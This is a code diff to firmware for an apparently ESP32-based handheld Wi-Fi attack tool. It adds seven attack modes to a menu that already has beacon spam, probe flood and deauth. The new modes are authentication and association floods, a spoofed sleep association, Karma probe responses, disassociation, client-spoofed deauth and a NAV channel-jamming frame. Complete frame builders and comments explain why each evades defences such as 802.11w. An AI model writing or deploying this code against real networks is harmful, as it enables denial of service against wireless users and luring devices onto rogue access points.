@@ -69,7 +69,35 @@ extern const ::AppManifest manifest;
 namespace {
 
 enum class Screen { Main, Capture, Inject, Network };
-enum class InjectMode { Beacon, Probe, Sleep };
+enum class InjectMode {
+    Beacon,        // fake beacons, random or supplied SSIDs
+    Probe,         // probe request flood
+    Sleep,         // directed deauth (the original "association sleep", which never was one)
+    AuthFlood,     // authentication frames from randomised MACs
+    AssocFlood,    // association requests from randomised MACs
+    AssocSleep,    // assoc request spoofed from the client with a long listen interval
+    Karma,         // probe responses, to be recognised as a network the client knows
+    Disassoc,      // disassociation frames, the sibling of deauth
+    ClientDeauth,  // deauth claiming to come from the client, addressed to the AP
+    Nav,           // long Duration field, so every listener holds off
+};
+
+// Dropdown order must match the enum order above.
+static const char* injectModeName(InjectMode mode) {
+    switch (mode) {
+        case InjectMode::Beacon: return "Beacon Spam";
+        case InjectMode::Probe: return "Probe Flood";
+        case InjectMode::Sleep: return "Association Sleep (deauth)";
+        case InjectMode::AuthFlood: return "Auth Flood";
+        case InjectMode::AssocFlood: return "Assoc Request Flood";
+        case InjectMode::AssocSleep: return "Assoc Spoof (listen interval)";
+        case InjectMode::Karma: return "Karma (probe response)";
+        case InjectMode::Disassoc: return "Disassociation";
+        case InjectMode::ClientDeauth: return "Client to AP Deauth";
+        case InjectMode::Nav: return "NAV / Duration";
+    }
+    return "?";
+}
 enum class NetMode { Host, Ssh, Telnet, Port };
 
 constexpr uint32_t POLL_INTERVAL_MS = 200;
@@ -612,6 +640,138 @@ static size_t buildDeauth(uint8_t* out, const uint8_t dest[6], const uint8_t bss
     return i;
 }
 
+// Locally-administered, unicast, random in the last five bytes. A flood presents the AP with a new
+// station every frame without colliding with real hardware addresses.
+static void randomiseMac(uint8_t mac[6]) {
+    const uint32_t r = esp_random();
+    mac[0] = 0x02;
+    mac[1] = static_cast<uint8_t>(r >> 24);
+    mac[2] = static_cast<uint8_t>(r >> 16);
+    mac[3] = static_cast<uint8_t>(r >> 8);
+    mac[4] = static_cast<uint8_t>(r);
+    mac[5] = static_cast<uint8_t>(esp_random());
+}
+
+static uint16_t nextSeqControl() {
+    static uint16_t s_seq = 0;
+    s_seq = (s_seq + 1) & 0x0FFF;
+    return static_cast<uint16_t>(s_seq << 4); // fragment(4) | sequence(12)
+}
+
+// Authentication, open system, sequence 1. The AP allocates state as soon as it sees one, which is
+// the point of flooding them: deauth evicts a client that is already there, this denies admission to
+// clients that are not. Addresses are (AP, station, BSSID) - the reverse of the deauth layout.
+static size_t buildAuth(uint8_t* out, const uint8_t client[6], const uint8_t bssid[6]) {
+    const uint16_t sc = nextSeqControl();
+    size_t i = 0;
+    out[i++] = 0xB0; out[i++] = 0x00;
+    out[i++] = 0x00; out[i++] = 0x00;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    std::memcpy(out + i, client, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    out[i++] = static_cast<uint8_t>(sc & 0xff);
+    out[i++] = static_cast<uint8_t>((sc >> 8) & 0xff);
+    out[i++] = 0x00; out[i++] = 0x00; // open system
+    out[i++] = 0x01; out[i++] = 0x00; // authentication sequence 1
+    out[i++] = 0x00; out[i++] = 0x00; // status: success
+    return i;
+}
+
+// Association request, with the listen interval under the caller's control. That field is the whole
+// point of the sleep variant: a large interval tells the AP the station intends to sleep for a long
+// time, so the AP buffers for it and treats it as present but unreachable.
+static size_t buildAssocRequest(uint8_t* out, const uint8_t client[6], const uint8_t bssid[6],
+                                const char* ssid, size_t ssidLen, uint16_t listenInterval) {
+    const uint16_t sc = nextSeqControl();
+    size_t i = 0;
+    out[i++] = 0x00; out[i++] = 0x00; // association request
+    out[i++] = 0x00; out[i++] = 0x00;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    std::memcpy(out + i, client, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    out[i++] = static_cast<uint8_t>(sc & 0xff);
+    out[i++] = static_cast<uint8_t>((sc >> 8) & 0xff);
+    out[i++] = 0x01; out[i++] = 0x00; // capability: ESS
+    out[i++] = static_cast<uint8_t>(listenInterval & 0xff);
+    out[i++] = static_cast<uint8_t>((listenInterval >> 8) & 0xff);
+    out[i++] = 0x00; out[i++] = static_cast<uint8_t>(ssidLen);
+    std::memcpy(out + i, ssid, ssidLen); i += ssidLen;
+    out[i++] = 0x01; out[i++] = 0x04;
+    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8b; out[i++] = 0x96;
+    return i;
+}
+
+// Probe response: what Karma answers with. The client asked whether a network it remembers is here,
+// and this says yes from a BSSID it has never seen, so it associates to the sender instead.
+//
+// Note this version sends to the broadcast address from the inject timer. Real Karma answers each
+// probe request individually, to the station that sent it, which needs the receive path - and the
+// sniffer is only running during a capture. Broadcast responses are often ignored by clients in a
+// scanning state, so treat this as the frame-building half and not yet the technique.
+static size_t buildProbeResponse(uint8_t* out, const uint8_t bssid[6],
+                                 const char* ssid, size_t ssidLen) {
+    const uint16_t sc = nextSeqControl();
+    size_t i = 0;
+    out[i++] = 0x50; out[i++] = 0x00; // probe response
+    out[i++] = 0x00; out[i++] = 0x00;
+    std::memcpy(out + i, (const uint8_t[]){0xff,0xff,0xff,0xff,0xff,0xff}, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    out[i++] = static_cast<uint8_t>(sc & 0xff);
+    out[i++] = static_cast<uint8_t>((sc >> 8) & 0xff);
+    std::memset(out + i, 0, 8); i += 8; // timestamp
+    out[i++] = 0x64; out[i++] = 0x00;   // beacon interval
+    out[i++] = 0x01; out[i++] = 0x00;   // capability: ESS
+    out[i++] = 0x00; out[i++] = static_cast<uint8_t>(ssidLen);
+    std::memcpy(out + i, ssid, ssidLen); i += ssidLen;
+    out[i++] = 0x01; out[i++] = 0x04;
+    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8b; out[i++] = 0x96;
+    return i;
+}
+
+// Disassociation: same frame shape as deauth, one subtype over. Some clients and APs act on one and
+// not the other, so having both is worth the few bytes.
+static size_t buildDisassoc(uint8_t* out, const uint8_t dest[6], const uint8_t bssid[6], bool bcast) {
+    const size_t len = buildDeauth(out, dest, bssid, bcast);
+    if (len > 0) out[0] = 0xA0;
+    return len;
+}
+
+// The other direction: sourced from the client and addressed to the AP, so the AP discards its own
+// view of that client. Effective where a client-addressed deauth is ignored but the AP trusts frames
+// that appear to come from the station itself.
+static size_t buildClientDeauth(uint8_t* out, const uint8_t client[6], const uint8_t bssid[6]) {
+    const uint16_t sc = nextSeqControl();
+    size_t i = 0;
+    out[i++] = 0xC0; out[i++] = 0x00;
+    out[i++] = 0x00; out[i++] = 0x00;
+    std::memcpy(out + i, bssid, 6); i += 6;  // addr1: the AP
+    std::memcpy(out + i, client, 6); i += 6; // addr2: claims to be the station
+    std::memcpy(out + i, bssid, 6); i += 6;  // addr3: BSSID
+    out[i++] = static_cast<uint8_t>(sc & 0xff);
+    out[i++] = static_cast<uint8_t>((sc >> 8) & 0xff);
+    out[i++] = 0x07; out[i++] = 0x00;        // reason: class 3 frame from nonassociated station
+    return i;
+}
+
+// Duration/NAV. The Duration field tells every station that hears the frame to stay quiet for that
+// long, whether or not the frame is addressed to it and whether or not it is associated. A null-data
+// frame addressed to the BSSID therefore holds the channel without touching anyone's association -
+// and because it is not a management frame, 802.11w does not protect against it.
+static size_t buildNav(uint8_t* out, const uint8_t bssid[6], uint16_t duration) {
+    const uint16_t sc = nextSeqControl();
+    size_t i = 0;
+    out[i++] = 0x48; out[i++] = 0x00; // data, null function
+    out[i++] = static_cast<uint8_t>(duration & 0xff);
+    out[i++] = static_cast<uint8_t>((duration >> 8) & 0xff);
+    std::memcpy(out + i, bssid, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    std::memcpy(out + i, bssid, 6); i += 6;
+    out[i++] = static_cast<uint8_t>(sc & 0xff);
+    out[i++] = static_cast<uint8_t>((sc >> 8) & 0xff);
+    return i;
+}
+
 // "Deauth to force handshake" elicitation, run by a dedicated timer while capture is active. Bursts
 // deauth frames that spoof the target AP's BSSID so a connected client reassociates and emits a
 // fresh EAPOL/PMKID, which the promiscuous sniffer writes to the same PCAP. Requires an AP BSSID;
@@ -699,6 +859,46 @@ static void onInjectTick(Context* ctx) {
             }
             case InjectMode::Sleep:
                 len = buildDeauth(frame, ctx->targetMac, usedBssid ? bssid : ctx->localMac, !usedBssid);
+                break;
+            case InjectMode::AuthFlood: {
+                // A fresh source address each frame, so every one is a station the AP has not seen.
+                uint8_t client[6];
+                randomiseMac(client);
+                len = buildAuth(frame, client, bssid);
+                break;
+            }
+            case InjectMode::AssocFlood: {
+                uint8_t client[6];
+                randomiseMac(client);
+                size_t sl = std::strlen(ctx->injectSsid);
+                if (sl > 32) sl = 32;
+                len = buildAssocRequest(frame, client, bssid, ctx->injectSsid, sl, 1);
+                break;
+            }
+            case InjectMode::AssocSleep: {
+                // Spoofed from the client, advertising the longest listen interval the field allows,
+                // so the AP believes it wants to sleep and buffers everything for it.
+                size_t sl = std::strlen(ctx->injectSsid);
+                if (sl > 32) sl = 32;
+                len = buildAssocRequest(frame, ctx->targetMac, bssid, ctx->injectSsid, sl, 0xFFFF);
+                break;
+            }
+            case InjectMode::Karma: {
+                size_t sl = std::strlen(ctx->injectSsid);
+                if (sl > 32) sl = 32;
+                len = buildProbeResponse(frame, bssid, ctx->injectSsid, sl);
+                break;
+            }
+            case InjectMode::Disassoc:
+                len = buildDisassoc(frame, ctx->targetMac, bssid, !usedBssid);
+                break;
+            case InjectMode::ClientDeauth:
+                len = buildClientDeauth(frame, ctx->targetMac, bssid);
+                break;
+            case InjectMode::Nav:
+                // 32767 is the largest Duration the 15-bit field holds; repeated at the inject rate
+                // this keeps every listener's NAV set.
+                len = buildNav(frame, bssid, 0x7FFF);
                 break;
         }
         if (len > 0) {
@@ -1221,14 +1421,36 @@ static void onInjectClientMacChanged(lv_event_t* event) {
     ctx->deauthClientKnown = parseMac(ctx->deauthClientText, ctx->deauthClient);
 }
 
-static void showInjectScreen(Context* ctx) {
-    const char* modeText = ctx->injectMode == InjectMode::Beacon ? "Beacon Spam"
-        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood" : "Association Sleep");
-    auto* label = lv_label_create(ctx->body);
-    lv_label_set_text(label, modeText);
+static void onInjectModeChanged(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    auto* dd = static_cast<lv_obj_t*>(lv_event_get_target(event));
+    // Re-enter the screen, so the fields that apply to the chosen mode are the ones on show.
+    setInjectModeAndGo(ctx, static_cast<InjectMode>(lv_dropdown_get_selected(dd)));
+}
 
-    // SSID input for beacon/probe only; sleep (which reuses deauth frames) doesn't use it.
-    if (ctx->injectMode != InjectMode::Sleep) {
+static void showInjectScreen(Context* ctx) {
+    // One dropdown rather than a button per mode: there are ten now and the rest of the screen is
+    // identical between them.
+    auto* modeDropdown = lv_dropdown_create(ctx->body);
+    std::string modeOptions = injectModeName(InjectMode::Beacon);
+    for (int m = 1; m <= static_cast<int>(InjectMode::Nav); ++m) {
+        modeOptions += "\n";
+        modeOptions += injectModeName(static_cast<InjectMode>(m));
+    }
+    lv_dropdown_set_options(modeDropdown, modeOptions.c_str());
+    lv_dropdown_set_selected(modeDropdown, static_cast<uint32_t>(ctx->injectMode));
+    lv_obj_set_width(modeDropdown, LV_PCT(100));
+    lv_obj_add_event_cb(modeDropdown, onInjectModeChanged, LV_EVENT_VALUE_CHANGED, ctx);
+
+    // The SSID field only means something to the modes that put an SSID in a frame: the beacon and
+    // probe floods, the association spoof and flood, and Karma's probe response. The deauth-based
+    // modes and the NAV attack carry none.
+    const bool usesSsid = ctx->injectMode == InjectMode::Beacon ||
+        ctx->injectMode == InjectMode::Probe ||
+        ctx->injectMode == InjectMode::AssocFlood ||
+        ctx->injectMode == InjectMode::AssocSleep ||
+        ctx->injectMode == InjectMode::Karma;
+    if (usesSsid) {
         auto* ssidTextarea = lv_textarea_create(ctx->body);
         lv_textarea_set_placeholder_text(ssidTextarea, "SSID (blank = Funny list for beacon)");
         lv_textarea_set_one_line(ssidTextarea, true);
